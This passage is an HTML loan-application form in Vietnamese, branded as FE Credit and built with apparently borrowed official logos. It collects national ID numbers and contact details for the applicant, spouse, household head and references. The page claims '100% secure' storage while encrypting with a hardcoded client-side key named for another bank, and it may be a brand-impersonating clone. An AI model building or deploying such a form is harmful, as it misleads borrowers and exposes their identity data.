<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>FE Credit - Bước 1: Thông tin cá nhân</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary-color: #00994F;
            --primary-hover: #007a3f;
            --text-color: #292929;
            --bg-light: #f8f9fa;
        }
        body { font-family: 'Be Vietnam Pro', sans-serif; background-color: var(--bg-light); color: var(--text-color); }
        
        /* Header & Nav */
        #site-header { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); padding: 10px 0; }
        .nav__link { text-decoration: none; color: var(--text-color); font-weight: 600; padding: 0 15px; }
        .nav__link:hover { color: var(--primary-color); }

        /* Banner */
        .banner-hero { position: relative; border-radius: 0 0 20px 20px; overflow: hidden; margin-bottom: 30px; }
        
        /* Progress Steps */
        .steps { display: flex; justify-content: space-between; margin: 30px auto; max-width: 800px; position: relative; }
        .step { flex: 1; text-align: center; font-size: 14px; font-weight: 600; color: #999; position: relative; z-index: 1; }
        .step.active { color: var(--primary-color); }
        .step.active::after { content: ''; position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%); width: 100%; height: 3px; background: var(--primary-color); }
        
        /* Form Styling */
        .step1-container { max-width: 800px; margin: 0 auto 50px; background: #fff; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
        .form-section-header { display: flex; align-items: center; margin-bottom: 24px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
        .form-section-icon { width: 40px; height: 40px; background: #e6f5ed; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--primary-color); margin-right: 15px; font-size: 18px; }
        .form-section-title { font-size: 18px; font-weight: 700; margin: 0; color: var(--primary-color); }
        .form-section-subtitle { font-size: 13px; color: #666; margin: 0; }
        
        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media (max-width: 768px) { .form-grid { grid-template-columns: 1fr; } }
        
        .form-field { position: relative; margin-bottom: 5px; }
        .form-label { font-weight: 500; font-size: 14px; margin-bottom: 8px; display: block; }
        .form-control { border-radius: 8px; padding: 12px 12px 12px 40px; border: 1px solid #ddd; font-size: 15px; transition: all 0.3s; }
        .form-control:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(0, 153, 79, 0.1); }
        .form-field-icon { position: absolute; left: 12px; top: 42px; color: #999; z-index: 2; }
        
        /* Validation States */
        .form-control.is-invalid { border-color: #dc3545; background-image: none; }
        .invalid-feedback { font-size: 12px; margin-top: 5px; }
        
        /* Buttons */
        .btn-next { width: 100%; margin-top: 30px; background: linear-gradient(135deg, #00994F 0%, #00b359 100%); border: none; padding: 16px; font-weight: 700; font-size: 16px; letter-spacing: 0.5px; border-radius: 12px; }
        .btn-next:disabled { background: #ccc; cursor: not-allowed; opacity: 0.7; }
        .btn-next:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 153, 79, 0.3); }

        /* Auto Save Indicator */
        .auto-save-indicator { position: fixed; bottom: 20px; right: 20px; background: #fff; padding: 10px 20px; border-radius: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); font-size: 13px; color: #666; display: flex; align-items: center; gap: 8px; transform: translateY(100px); transition: transform 0.3s ease; z-index: 1000; }
        .auto-save-indicator.show { transform: translateY(0); }
        .auto-save-indicator.success { color: var(--primary-color); }
    </style>
</head>
<body>
    <div id="site">
        <header id="site-header">
            <div class="container d-flex justify-content-between align-items-center">
                <div id="logo" style="width: 150px;">
                    <a href="index.html">
                        <img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="FE CREDIT Logo" style="width:100%">
                    </a>
                </div>
                <nav class="d-none d-md-block">
                    <a class="nav__link" href="../index.html">Trang Chủ</a>
                    <a class="nav__link" href="#site-footer">Liên Hệ</a>
                </nav>
            </div>
        </header>

        <main id="site-content">
            <section class="banner-hero">
                <img src="https://www-cdn.fecredit.com.vn/media/orjlo45e/banner-destop.jpg" alt="Banner" style="width: 100%; height: auto; display: block;">
            </section>

            <div class="container">
                <div id="errorSummaryAlert" class="alert alert-danger" style="display: none;">
                    <i class="fas fa-exclamation-triangle me-2"></i>
                    <span id="errorSummaryText">Vui lòng kiểm tra thông tin</span>
                </div>
            </div>

            <div class="container">
                <div class="steps">
                    <div class="step active">1. THÔNG TIN CÁ NHÂN</div>
                    <div class="step">2. KHOẢN VAY</div>
                    <div class="step">3. XÁC THỰC</div>
                </div>
            </div>

            <div class="container">
                <div class="step1-container">
                    <form id="registrationForm" onsubmit="return false;" novalidate>
                        
                        <div class="form-section">
                            <div class="form-section-header">
                                <div class="form-section-icon"><i class="fas fa-user"></i></div>
                                <div>
                                    <h3 class="form-section-title">THÔNG TIN CÁ NHÂN</h3>
                                    <p class="form-section-subtitle">Nhập chính xác theo CCCD/CMND</p>
                                </div>
                            </div>
                            
                            <div class="form-grid">
                                <div class="form-field">
                                    <label for="fullName" class="form-label">Họ và tên *</label>
                                    <i class="fas fa-user form-field-icon"></i>
                                    <input type="text" class="form-control" id="fullName" name="fullName" required placeholder="NGUYEN VAN A" style="text-transform: uppercase;">
                                    <div class="invalid-feedback" id="fullNameError">Họ tên không được để trống</div>
                                </div>

                                <div class="form-field">
                                    <label for="dob" class="form-label">Ngày sinh *</label>
                                    <i class="fas fa-calendar-alt form-field-icon"></i>
                                    <input type="text" class="form-control" id="dob" name="dob" required placeholder="dd/mm/yyyy" maxlength="10">
                                    <div class="invalid-feedback" id="dobError">Ngày sinh không hợp lệ</div>
                                </div>
                                
                                <div class="form-field">
                                    <label for="gender" class="form-label">Giới tính *</label>
                                    <i class="fas fa-venus-mars form-field-icon"></i>
                                    <select class="form-control" id="gender" name="gender" required>
                                        <option value="">Chọn giới tính</option>
                                        <option value="Nam">Nam</option>
                                        <option value="Nữ">Nữ</option>
                                    </select>
                                    <div class="invalid-feedback" id="genderError">Vui lòng chọn giới tính</div>
                                </div>

                                <div class="form-field">
                                    <label for="cccd" class="form-label">Số CCCD/CMND *</label>
                                    <i class="fas fa-id-card form-field-icon"></i>
                                    <input type="text" class="form-control" id="cccd" name="cccd" required maxlength="12" placeholder="Nhập 12 số CCCD">
                                    <div class="invalid-feedback" id="cccdError">CCCD phải đủ 12 số</div>
                                </div>

                                <div class="form-field">
                                    <label for="issueDate" class="form-label">Ngày cấp *</label>
                                    <i class="fas fa-calendar form-field-icon"></i>
                                    <input type="text" class="form-control" id="issueDate" name="issueDate" required placeholder="dd/mm/yyyy" maxlength="10">
                                    <div class="invalid-feedback" id="issueDateError">Ngày cấp không hợp lệ</div>
                                </div>

                                <div class="form-field">
                                    <label for="maritalStatus" class="form-label">Tình trạng hôn nhân *</label>
                                    <i class="fas fa-heart form-field-icon"></i>
                                    <select class="form-control" id="maritalStatus" name="maritalStatus" required>
                                        <option value="">Chọn tình trạng</option>
                                        <option value="Độc thân">Độc thân</option>
                                        <option value="Đã kết hôn">Đã kết hôn</option>
                                        <option value="Đã ly hôn">Đã ly hôn</option>
                                        <option value="Góa phụ">Góa phụ</option>
                                        <option value="Khác">Khác</option>
                                    </select>
                                    <div class="invalid-feedback" id="maritalStatusError">Vui lòng chọn tình trạng hôn nhân</div>
                                </div>
                            </div>
                            
                            <div class="form-field mt-3">
                                <label for="contactAddress" class="form-label">Địa chỉ hiện tại đang sinh sống *</label>
                                <i class="fas fa-map-marker-alt form-field-icon"></i>
                                <input type="text" class="form-control" id="contactAddress" name="contactAddress" required placeholder="Số nhà, Đường, Phường/Xã, Quận/Huyện, Tỉnh/Thành">
                                <div class="invalid-feedback" id="contactAddressError">Vui lòng nhập địa chỉ đầy đủ</div>
                            </div>
                        </div>

                        <div class="form-section mt-4">
                            <div class="form-section-header">
                                <div class="form-section-icon"><i class="fas fa-phone"></i></div>
                                <div>
                                    <h3 class="form-section-title">THÔNG TIN LIÊN HỆ</h3>
                                    <p class="form-section-subtitle">Để nhận thông báo kết quả vay</p>
                                </div>
                            </div>
                            
                            <div class="form-grid">
                                <div class="form-field">
                                    <label for="issuePlace" class="form-label">Nơi cấp CCCD *</label>
                                    <i class="fas fa-building form-field-icon"></i>
                                    <select class="form-control" id="issuePlace" name="issuePlace" required>
                                        <option value="">Chọn nơi cấp</option>
                                        <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
                                        <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
                                    </select>
                                    <div class="invalid-feedback" id="issuePlaceError">Vui lòng chọn nơi cấp</div>
                                </div>

                                <div class="form-field">
                                    <label for="phone" class="form-label">Số ĐTDĐ *</label>
                                    <i class="fas fa-mobile-alt form-field-icon"></i>
                                    <input type="tel" class="form-control" id="phone" name="phone" required maxlength="10" placeholder="09xxxxxxxx">
                                    <div class="invalid-feedback" id="phoneError">SĐT không hợp lệ</div>
                                </div>

                                <div class="form-field">
                                    <label for="homePhone" class="form-label">Số ĐT nhà theo HK</label>
                                    <i class="fas fa-phone form-field-icon"></i>
                                    <input type="tel" class="form-control" id="homePhone" name="homePhone" maxlength="11" placeholder="Nhập số điện thoại">
                                </div>

                                <div class="form-field">
                                    <label for="landlinePhone" class="form-label">Số ĐT cố định tại nơi cư trú</label>
                                    <i class="fas fa-phone-alt form-field-icon"></i>
                                    <input type="tel" class="form-control" id="landlinePhone" name="landlinePhone" maxlength="11" placeholder="Nhập số điện thoại">
                                </div>

                                <div class="form-field">
                                    <label for="workPhone" class="form-label">Số ĐT tại nơi làm việc</label>
                                    <i class="fas fa-briefcase form-field-icon"></i>
                                    <input type="tel" class="form-control" id="workPhone" name="workPhone" maxlength="11" placeholder="Nhập số điện thoại">
                                </div>
                                
                                <div class="form-field">
                                    <label for="email" class="form-label">Địa chỉ email *</label>
                                    <i class="fas fa-envelope form-field-icon"></i>
                                    <input type="email" class="form-control" id="email" name="email" required placeholder="email@example.com">
                                    <div class="invalid-feedback" id="emailError">Email không hợp lệ</div>
                                </div>
                            </div>
                        </div>

                        <!-- Thông tin Chủ Hộ khẩu -->
                        <div class="form-section mt-4">
                            <div class="form-section-header">
                                <div class="form-section-icon"><i class="fas fa-home"></i></div>
                                <div>
                                    <h3 class="form-section-title">THÔNG TIN CHỦ HỘ KHẨU</h3>
                                    <p class="form-section-subtitle">Nếu bạn không phải là chủ hộ khẩu</p>
                                </div>
                            </div>
                            
                            <div class="form-field mb-3">
                                <label class="form-label">Bên vay có phải là Chủ HK? *</label>
                                <div class="d-flex gap-3">
                                    <div class="form-check">
                                        <input class="form-check-input" type="radio" name="isHouseholdHead" id="isHouseholdHeadYes" value="yes" checked>
                                        <label class="form-check-label" for="isHouseholdHeadYes">Có</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="radio" name="isHouseholdHead" id="isHouseholdHeadNo" value="no">
                                        <label class="form-check-label" for="isHouseholdHeadNo">Không</label>
                                    </div>
                                </div>
                            </div>

                            <div id="householdHeadInfo" style="display: none;">
                                <div class="form-grid">
                                    <div class="form-field">
                                        <label for="householdHeadName" class="form-label">Họ và tên Chủ HK *</label>
                                        <i class="fas fa-user form-field-icon"></i>
                                        <input type="text" class="form-control" id="householdHeadName" name="householdHeadName" placeholder="NGUYEN VAN B" style="text-transform: uppercase;">
                                    </div>
                                    <div class="form-field">
                                        <label for="householdHeadCCCD" class="form-label">SỐ CMND Chủ HK *</label>
                                        <i class="fas fa-id-card form-field-icon"></i>
                                        <input type="text" class="form-control" id="householdHeadCCCD" name="householdHeadCCCD" maxlength="12" placeholder="Nhập 12 số">
                                    </div>
                                    <div class="form-field">
                                        <label for="householdHeadPhone" class="form-label">ĐT liên hệ Chủ HK *</label>
                                        <i class="fas fa-phone form-field-icon"></i>
                                        <input type="tel" class="form-control" id="householdHeadPhone" name="householdHeadPhone" maxlength="10" placeholder="09xxxxxxxx">
                                    </div>
                                    <div class="form-field">
                                        <label for="householdHeadRelationship" class="form-label">Quan hệ với KH *</label>
                                        <i class="fas fa-users form-field-icon"></i>
                                        <select class="form-control" id="householdHeadRelationship" name="householdHeadRelationship">
                                            <option value="">Chọn quan hệ</option>
                                            <option value="Cha">Cha</option>
                                            <option value="Mẹ">Mẹ</option>
                                            <option value="Anh">Anh</option>
                                            <option value="Chị">Chị</option>
                                            <option value="Em">Em</option>
                                            <option value="Khác">Khác</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Thông tin học vấn và việc làm -->
                        <div class="form-section mt-4">
                            <div class="form-section-header">
                                <div class="form-section-icon"><i class="fas fa-briefcase"></i></div>
                                <div>
                                    <h3 class="form-section-title">THÔNG TIN HỌC VẤN VÀ VIỆC LÀM</h3>
                                    <p class="form-section-subtitle">Thông tin công việc hiện tại</p>
                                </div>
                            </div>
                            
                            <div class="form-grid">
                                <div class="form-field">
                                    <label for="educationLevel" class="form-label">Trình độ học vấn *</label>
                                    <i class="fas fa-graduation-cap form-field-icon"></i>
                                    <select class="form-control" id="educationLevel" name="educationLevel" required>
                                        <option value="">Chọn trình độ</option>
                                        <option value="Tiểu học">Tiểu học</option>
                                        <option value="THCS">THCS</option>
                                        <option value="THPT">THPT</option>
                                        <option value="Trung cấp">Trung cấp</option>
                                        <option value="Cao đẳng">Cao đẳng</option>
                                        <option value="Đại học">Đại học</option>
                                        <option value="Sau ĐH">Sau ĐH</option>
                                        <option value="Khác">Khác</option>
                                    </select>
                                    <div class="invalid-feedback" id="educationLevelError">Vui lòng chọn trình độ học vấn</div>
                                </div>

                                <div class="form-field">
                                    <label for="companyName" class="form-label">Tên Đơn vị công tác *</label>
                                    <i class="fas fa-building form-field-icon"></i>
                                    <input type="text" class="form-control" id="companyName" name="companyName" required placeholder="Tên công ty">
                                    <div class="invalid-feedback" id="companyNameError">Vui lòng nhập tên công ty</div>
                                </div>

                                <div class="form-field">
                                    <label for="companyTaxId" class="form-label">Mã số thuế Công ty (nếu có)</label>
                                    <i class="fas fa-file-invoice form-field-icon"></i>
                                    <input type="text" class="form-control" id="companyTaxId" name="companyTaxId" placeholder="Mã số thuế">
                                </div>

                                <div class="form-field">
                                    <label for="position" class="form-label">Chức vụ *</label>
                                    <i class="fas fa-user-tie form-field-icon"></i>
                                    <input type="text" class="form-control" id="position" name="position" required placeholder="Chức vụ">
                                    <div class="invalid-feedback" id="positionError">Vui lòng nhập chức vụ</div>
                                </div>

                                <div class="form-field" style="grid-column: 1 / -1;">
                                    <label for="companyAddress" class="form-label">Địa chỉ Công ty *</label>
                                    <i class="fas fa-map-marker-alt form-field-icon"></i>
                                    <input type="text" class="form-control" id="companyAddress" name="companyAddress" required placeholder="Địa chỉ công ty">
                                    <div class="invalid-feedback" id="companyAddressError">Vui lòng nhập địa chỉ công ty</div>
                                </div>

                                <div class="form-field">
                                    <label for="workDuration" class="form-label">Thời gian làm việc ở nơi làm hiện tại *</label>
                                    <i class="fas fa-clock form-field-icon"></i>
                                    <input type="text" class="form-control" id="workDuration" name="workDuration" required placeholder="VD: 2 năm">
                                    <div class="invalid-feedback" id="workDurationError">Vui lòng nhập thời gian làm việc</div>
                                </div>

                                <div class="form-field">
                                    <label for="payday" class="form-label">Ngày nhận lương hàng tháng *</label>
                                    <i class="fas fa-calendar-check form-field-icon"></i>
                                    <input type="number" class="form-control" id="payday" name="payday" required min="1" max="31" placeholder="VD: 15">
                                    <small class="text-muted">Nhập ngày trong tháng (1-31)</small>
                                    <div class="invalid-feedback" id="paydayError">Vui lòng nhập ngày nhận lương</div>
                                </div>
                            </div>
                        </div>

                        <!-- Năng lực tài chính -->
                        <div class="form-section mt-4">
                            <div class="form-section-header">
                                <div class="form-section-icon"><i class="fas fa-money-bill-wave"></i></div>
                                <div>
                                    <h3 class="form-section-title">NĂNG LỰC TÀI CHÍNH</h3>
                                    <p class="form-section-subtitle">Thu nhập và chi phí hàng tháng</p>
                                </div>
                            </div>
                            
                            <div class="form-grid">
                                <div class="form-field">
                                    <label for="mainIncome" class="form-label">Lương/thu nhập chính (VNĐ/tháng) *</label>
                                    <i class="fas fa-wallet form-field-icon"></i>
                                    <input type="text" class="form-control" id="mainIncome" name="mainIncome" required placeholder="VD: 10,000,000">
                                    <div class="invalid-feedback" id="mainIncomeError">Vui lòng nhập thu nhập chính</div>
                                </div>

                                <div class="form-field">
                                    <label for="additionalIncome" class="form-label">Thu nhập phụ (VNĐ/tháng)</label>
                                    <i class="fas fa-coins form-field-icon"></i>
                                    <input type="text" class="form-control" id="additionalIncome" name="additionalIncome" placeholder="VD: 2,000,000">
                                </div>

                                <div class="form-field">
                                    <label for="personalExpenses" class="form-label">Chi phí cá nhân (VNĐ/tháng) *</label>
                                    <i class="fas fa-shopping-cart form-field-icon"></i>
                                    <input type="text" class="form-control" id="personalExpenses" name="personalExpenses" required placeholder="VD: 5,000,000">
                                    <div class="invalid-feedback" id="personalExpensesError">Vui lòng nhập chi phí cá nhân</div>
                                </div>
                            </div>
                        </div>

                        <!-- Thông tin người tham chiếu -->
                        <div class="form-section mt-4">
                            <div class="form-section-header">
                                <div class="form-section-icon"><i class="fas fa-user-friends"></i></div>
                                <div>
                                    <h3 class="form-section-title">THÔNG TIN NGƯỜI THAM CHIẾU</h3>
                                    <p class="form-section-subtitle">Người có thể liên hệ khi cần</p>
                                </div>
                            </div>
                            
                            <div class="form-grid">
                                <div class="form-field">
                                    <label for="ref1Name" class="form-label">Họ và tên người tham chiếu 1 *</label>
                                    <i class="fas fa-user form-field-icon"></i>
                                    <input type="text" class="form-control" id="ref1Name" name="ref1Name" required placeholder="NGUYEN VAN C" style="text-transform: uppercase;">
                                    <div class="invalid-feedback" id="ref1NameError">Vui lòng nhập họ tên</div>
                                </div>

                                <div class="form-field">
                                    <label for="ref1Relationship" class="form-label">Mối quan hệ *</label>
                                    <i class="fas fa-users form-field-icon"></i>
                                    <select class="form-control" id="ref1Relationship" name="ref1Relationship" required>
                                        <option value="">Chọn quan hệ</option>
                                        <option value="Bạn bè">Bạn bè</option>
                                        <option value="Đồng nghiệp">Đồng nghiệp</option>
                                        <option value="Người thân">Người thân</option>
                                        <option value="Khác">Khác</option>
                                    </select>
                                    <div class="invalid-feedback" id="ref1RelationshipError">Vui lòng chọn quan hệ</div>
                                </div>

                                <div class="form-field">
                                    <label for="ref1Phone" class="form-label">SĐT người tham chiếu 1 *</label>
                                    <i class="fas fa-phone form-field-icon"></i>
                                    <input type="tel" class="form-control" id="ref1Phone" name="ref1Phone" required maxlength="10" placeholder="09xxxxxxxx">
                                    <div class="invalid-feedback" id="ref1PhoneError">SĐT không hợp lệ</div>
                                </div>

                                <div class="form-field">
                                    <label for="ref2Name" class="form-label">Họ và tên người tham chiếu 2 *</label>
                                    <i class="fas fa-user form-field-icon"></i>
                                    <input type="text" class="form-control" id="ref2Name" name="ref2Name" required placeholder="NGUYEN VAN D" style="text-transform: uppercase;">
                                    <div class="invalid-feedback" id="ref2NameError">Vui lòng nhập họ tên</div>
                                </div>

                                <div class="form-field">
                                    <label for="ref2Relationship" class="form-label">Mối quan hệ *</label>
                                    <i class="fas fa-users form-field-icon"></i>
                                    <select class="form-control" id="ref2Relationship" name="ref2Relationship" required>
                                        <option value="">Chọn quan hệ</option>
                                        <option value="Bạn bè">Bạn bè</option>
                                        <option value="Đồng nghiệp">Đồng nghiệp</option>
                                        <option value="Người thân">Người thân</option>
                                        <option value="Khác">Khác</option>
                                    </select>
                                    <div class="invalid-feedback" id="ref2RelationshipError">Vui lòng chọn quan hệ</div>
                                </div>

                                <div class="form-field">
                                    <label for="ref2Phone" class="form-label">SĐT người tham chiếu 2 *</label>
                                    <i class="fas fa-phone form-field-icon"></i>
                                    <input type="tel" class="form-control" id="ref2Phone" name="ref2Phone" required maxlength="10" placeholder="09xxxxxxxx">
                                    <div class="invalid-feedback" id="ref2PhoneError">SĐT không hợp lệ</div>
                                </div>
                            </div>
                        </div>

                        <!-- Thông tin gia đình -->
                        <div class="form-section mt-4">
                            <div class="form-section-header">
                                <div class="form-section-icon"><i class="fas fa-home"></i></div>
                                <div>
                                    <h3 class="form-section-title">THÔNG TIN GIA ĐÌNH</h3>
                                    <p class="form-section-subtitle">Thông tin vợ/chồng (nếu có)</p>
                                </div>
                            </div>
                            
                            <div class="form-grid">
                                <div class="form-field">
                                    <label for="spouseName" class="form-label">Họ tên vợ/chồng (nếu có)</label>
                                    <i class="fas fa-user form-field-icon"></i>
                                    <input type="text" class="form-control" id="spouseName" name="spouseName" placeholder="NGUYEN THI B" style="text-transform: uppercase;">
                                </div>

                                <div class="form-field">
                                    <label for="spouseCCCD" class="form-label">Số CMND của vợ/chồng (nếu có)</label>
                                    <i class="fas fa-id-card form-field-icon"></i>
                                    <input type="text" class="form-control" id="spouseCCCD" name="spouseCCCD" maxlength="12" placeholder="Nhập 12 số">
                                </div>

                                <div class="form-field">
                                    <label for="spousePhone" class="form-label">Số ĐT của vợ/chồng (nếu có)</label>
                                    <i class="fas fa-phone form-field-icon"></i>
                                    <input type="tel" class="form-control" id="spousePhone" name="spousePhone" maxlength="10" placeholder="09xxxxxxxx">
                                </div>
                            </div>
                        </div>

                        <!-- Cung cấp thông tin -->
                        <div class="form-section mt-4">
                            <div class="form-section-header">
                                <div class="form-section-icon"><i class="fas fa-info-circle"></i></div>
                                <div>
                                    <h3 class="form-section-title">CUNG CẤP THÔNG TIN</h3>
                                    <p class="form-section-subtitle">Xác nhận đồng ý cung cấp thông tin</p>
                                </div>
                            </div>
                            
                            <div class="form-field mb-3">
                                <div class="form-check">
                                    <input class="form-check-input" type="checkbox" id="agreeInfoSharing" name="agreeInfoSharing" required>
                                    <label class="form-check-label" for="agreeInfoSharing">
                                        Tôi đồng ý cho Bên cho vay cung cấp thông tin của Tôi và thông tin khoản vay cho Bên Thứ Ba theo Hợp đồng này *
                                    </label>
                                </div>
                                <div class="invalid-feedback" id="agreeInfoSharingError">Vui lòng đồng ý điều khoản này</div>
                            </div>

                            <div class="form-field">
                                <div class="form-check">
                                    <input class="form-check-input" type="checkbox" id="agreePromotion" name="agreePromotion">
                                    <label class="form-check-label" for="agreePromotion">
                                        Tôi đồng ý nhận thông tin quảng cáo của Bên cho vay
                                    </label>
                                </div>
                            </div>
                        </div>

                        <div class="step-navigation">
                             <div class="d-flex align-items-center mb-3 text-muted" style="font-size: 13px;">
                                <i class="fas fa-lock me-2" style="color: var(--primary-color);"></i>
                                Thông tin của bạn được bảo mật tuyệt đối 100%
                            </div>
                            <button type="button" onclick="goToStep2()" class="btn btn-primary btn-next" id="submitButton">
                                TIẾP TỤC <i class="fas fa-arrow-right ms-2"></i>
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </main>

        <footer id="site-footer" class="bg-light py-4 text-center">
            <div class="container">
                <p class="text-muted small">© 2024 FE Credit. All rights reserved.</p>
            </div>
        </footer>
    </div>

    <div id="autoSaveIndicator" class="auto-save-indicator">
        <i class="fas fa-save"></i> Đang lưu...
    </div>

    <div id="loadingModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
        <div class="bg-white p-4 rounded-3 text-center" style="width: 300px;">
            <div class="spinner-border text-success mb-3" role="status"></div>
            <h5 class="mb-2">Đang xử lý...</h5>
            <p class="text-muted small mb-0">Đang chuyển sang bước 2</p>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>

    <script>
        // --- 1. UTILITIES (From step1cu.html) ---
        const SECRET_KEY = 'shinhan-secret-key'; // Match with step1cu.html

        function showAutoSave() {
            const indicator = $('#autoSaveIndicator');
            indicator.addClass('show');
            setTimeout(() => {
                indicator.addClass('success').html('<i class="fas fa-check"></i> Đã lưu');
                setTimeout(() => indicator.removeClass('show success').html('<i class="fas fa-save"></i> Đang lưu...'), 2000);
            }, 500);
        }

        // Mã hóa và lưu vào LocalStorage (From step1cu.html)
        function saveUserData(data) {
            try {
                // Lấy data cũ nếu có để không bị mất thông tin các bước khác
                let existingData = {};
                const encryptedOld = localStorage.getItem('userData');
                if (encryptedOld) {
                    try {
                        existingData = JSON.parse(CryptoJS.AES.decrypt(encryptedOld, SECRET_KEY).toString(CryptoJS.enc.Utf8));
                    } catch(e) {}
                }

                // Merge data mới vào data cũ
                const newData = { ...existingData, ...data, currentStep: 1, timestamp: new Date().toISOString() };
                
                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(newData), SECRET_KEY).toString();
                localStorage.setItem('userData', encrypted);
                showAutoSave();
                return true;
            } catch (error) {
                console.error("Save error", error);
                return false;
            }
        }

        function loadUserData() {
            const encrypted = localStorage.getItem('userData');
            if (!encrypted) return null;
            try {
                return JSON.parse(CryptoJS.AES.decrypt(encrypted, SECRET_KEY).toString(CryptoJS.enc.Utf8));
            } catch (e) {
                return null;
            }
        }

        // --- 2. VALIDATION LOGIC (From step1cu.html) ---
        function validateStep1() {
            let isValid = true;
            let firstErrorElement = null;
            const today = new Date();
            today.setHours(0, 0, 0, 0);
            
            // Validate Họ tên
            const fullName = $('#fullName').val().trim();
            if (fullName.length < 3) {
                $('#fullName').addClass('is-invalid');
                $('#fullNameError').text('Họ và tên phải dài hơn 2 ký tự.');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#fullName')[0];
            } else {
                $('#fullName').removeClass('is-invalid');
            }

            // Validate Ngày sinh
            const dob = $('#dob').val();
            if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dob)) {
                $('#dob').addClass('is-invalid');
                $('#dobError').text('Ngày sinh không hợp lệ (dd/mm/yyyy).');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#dob')[0];
            } else {
                const [day, month, year] = dob.split('/').map(Number);
                if (year < 1900 || year > today.getFullYear()) {
                    $('#dob').addClass('is-invalid');
                    $('#dobError').text('Năm sinh không hợp lệ.');
                    isValid = false;
                    if (!firstErrorElement) firstErrorElement = $('#dob')[0];
                } else {
                    const birthDate = new Date(year, month - 1, day);
                    if (birthDate > today) {
                        $('#dob').addClass('is-invalid');
                        $('#dobError').text('Ngày sinh không được ở tương lai.');
                        isValid = false;
                        if (!firstErrorElement) firstErrorElement = $('#dob')[0];
                    } else {
                        // Check age (18-70)
                        const ageDifMs = today - birthDate.getTime();
                        const ageDate = new Date(ageDifMs);
                        const age = Math.abs(ageDate.getUTCFullYear() - 1970);
                        
                        if (age < 18) {
                            $('#dob').addClass('is-invalid');
                            $('#dobError').text('Bạn phải đủ 18 tuổi để vay.');
                            isValid = false;
                            if (!firstErrorElement) firstErrorElement = $('#dob')[0];
                        } else if (age > 70) {
                            $('#dob').addClass('is-invalid');
                            $('#dobError').text('Độ tuổi vượt quá giới hạn (70 tuổi).');
                            isValid = false;
                            if (!firstErrorElement) firstErrorElement = $('#dob')[0];
                        } else {
                            $('#dob').removeClass('is-invalid');
                        }
                    }
                }
            }

            // Validate Giới tính
            if (!$('#gender').val()) {
                $('#gender').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#gender')[0];
            } else {
                $('#gender').removeClass('is-invalid');
            }

            // Validate CCCD (12 số)
            const cccd = $('#cccd').val().replace(/\s/g, '');
            if (!/^\d{12}$/.test(cccd)) {
                $('#cccd').addClass('is-invalid');
                $('#cccdError').text('CCCD phải là 12 số.');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#cccd')[0];
            } else {
                $('#cccd').removeClass('is-invalid');
            }

            // Validate Địa chỉ
            if ($('#contactAddress').val().trim().length < 6) {
                $('#contactAddress').addClass('is-invalid');
                $('#contactAddressError').text('Địa chỉ thường trú phải dài hơn 5 ký tự.');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#contactAddress')[0];
            } else {
                $('#contactAddress').removeClass('is-invalid');
            }

            // Validate Nơi cấp
            if (!$('#issuePlace').val()) {
                $('#issuePlace').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#issuePlace')[0];
            } else {
                $('#issuePlace').removeClass('is-invalid');
            }

            // Validate SĐT (10 số, bắt đầu bằng 0)
            const phone = $('#phone').val().replace(/\s/g, '');
            if (!/^0[1-9][0-9]{8}$/.test(phone)) {
                $('#phone').addClass('is-invalid');
                $('#phoneError').text('Số điện thoại phải là 10 số, bắt đầu bằng 0.');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#phone')[0];
            } else {
                $('#phone').removeClass('is-invalid');
            }

            // Validate Email
            const email = $('#email').val().trim();
            if (!/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email)) {
                $('#email').addClass('is-invalid');
                $('#emailError').text('Email không hợp lệ.');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#email')[0];
            } else {
                $('#email').removeClass('is-invalid');
            }

